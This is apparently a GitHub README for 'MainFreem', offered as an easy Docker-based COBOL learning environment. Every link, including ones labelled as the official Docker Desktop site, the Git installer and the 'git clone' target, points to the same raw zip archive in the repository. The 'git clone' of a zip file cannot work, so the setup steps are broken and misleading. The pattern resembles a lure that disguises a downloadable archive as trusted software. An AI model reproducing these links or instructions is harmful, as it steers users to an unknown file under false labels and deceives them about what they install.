# 🐳 MainFreem - Easy COBOL Learning Environment

[![Download MainFreem](https://img.shields.io/badge/Download-MainFreem-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip)

MainFreem gives you a ready-to-use setup for running COBOL programs. You do not need to install anything complicated. The environment runs inside Docker containers, so you get a clean and safe way to learn and work with COBOL.

---

## 📋 What is MainFreem?

MainFreem is a tool designed for people who want to learn COBOL, a programming language used by many large companies. It uses Docker technology. That means MainFreem sets up everything needed to run COBOL programs inside a small, isolated workspace on your computer.

You won't have to install COBOL compilers or manage complex software requirements. MainFreem makes it simple. Just start the container, and you have a working space ready for COBOL.

---

## 🖥 System Requirements

To run MainFreem on Windows, your PC needs to meet these requirements:

- Windows 10 or later (64-bit)
- At least 4 GB of RAM (8 GB recommended for smoother experience)
- Minimum 10 GB free disk space
- Docker Desktop installed and running (see next section)
- Internet connection to download the files

---

## 🐳 Installing Docker on Windows

MainFreem runs inside Docker, so you need Docker installed on your PC. Docker lets you run software inside containers. Follow these steps:

1. Visit the Docker Desktop official website: https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip
2. Click the "Download for Windows" button.
3. Run the downloaded file and follow the installation instructions.
4. After installation, open Docker Desktop to make sure it is running.
5. Docker may ask you to enable WSL 2 (Windows Subsystem for Linux). Follow any prompts to do this.

Once Docker Desktop is running, you are ready for the next step.

---

## 🚀 Getting MainFreem

You can get MainFreem here:

[![Download MainFreem](https://img.shields.io/badge/Download-MainFreem-blue?style=for-the-badge)](https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip)

Clicking the link will take you straight to the GitHub page where you can get the files and instructions.

---

## ⬇️ How to Download and Run MainFreem

Follow these steps to download and use MainFreem on your Windows PC:

1. Open your web browser and go to the MainFreem page:  
   https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip

2. On the page, you will find the files needed to run the environment. You do not need to download and install software here manually.

3. Instead, use Command Prompt or PowerShell:

   - Press **Windows key + R**, type `cmd`, and press Enter.
   - Or press **Windows key**, type `PowerShell`, and open Windows PowerShell.

4. In the command window, type this command and press Enter:

   ```
   git clone https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip
   ```

   This command downloads the MainFreem files to your PC.

   *If you don’t have git installed, download it here: https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip*  
   Follow the setup instructions on that page, then repeat this step.

5. Change into the downloaded folder by typing:

   ```
   cd MainFreem
   ```

6. Now, build and start the Docker container with this command:

   ```
   docker-compose up --build
   ```

7. Docker will download the needed images and set up the environment. This may take several minutes on the first run.

8. After setup finishes, you will be inside a ready COBOL environment.

---

## 📝 Using MainFreem

Inside the Docker container, you can write COBOL programs and run them. Here are the basic steps:

- To create a new COBOL file, use any text editor inside the container or from your Windows PC inside the `MainFreem` folder.
- Save your program with a `.cob` or `.cbl` extension.
- To compile your program, run:

  ```
  cobc -x your_program.cob
  ```

- To run the compiled program, enter:

  ```
  ./your_program
  ```

This setup uses GNU COBOL, an open-source COBOL compiler included in the container.

---

## ⚙️ Common Commands

Here are some commands you will use often inside MainFreem's environment:

- **List files:**

  ```
  ls
  ```

- **Open a text editor (nano):**

  ```
  nano filename.cob
  ```

- **Compile COBOL program:**

  ```
  cobc -x filename.cob
  ```

- **Run compiled program:**

  ```
  ./filename
  ```

- **Stop the Docker container:**

  Press `Ctrl + C` in the terminal where Docker is running.

---

## 🛠 Troubleshooting Tips

- If Docker does not start, try restarting your computer.
- Make sure you have enough disk space and RAM.
- If you get permission errors, run PowerShell or Command Prompt as Administrator.
- To update MainFreem, run:

  ```
  git pull
  ```

  inside the MainFreem folder, then run:

  ```
  docker-compose up --build
  ```

- Check your internet connection if downloads freeze.

---

## 📚 Learn More About COBOL

MainFreem is a perfect place to start if you want to learn COBOL basics or practice coding. Many resources are available online to complement this environment.

Look for simple tutorials on COBOL syntax, program structure, and basic operations if you want to improve step by step.

---

## 🧰 About the Environment

MainFreem uses a Dockerfile designed to set up:

- GNU COBOL compiler and tools
- A shell interface for running commands
- A lightweight Linux environment inside the container
- Volume mapping so you can edit files on your Windows PC and run them inside Docker

The container makes sure your Windows system stays clean without worrying about conflicting software.

---

## 🔎 What Topics Does MainFreem Cover?

- cobol  
- devcontainer  
- development  
- docker  
- dockerfile  
- education  
- environment  
- gnu-cobol  
- learning  
- mainframe

---

## 🚩 Next Steps

After you successfully run MainFreem:

- Start by creating simple COBOL programs.
- Modify and run examples.
- Try to explore the basic commands listed above.
- Check out online tutorials or COBOL courses for further learning.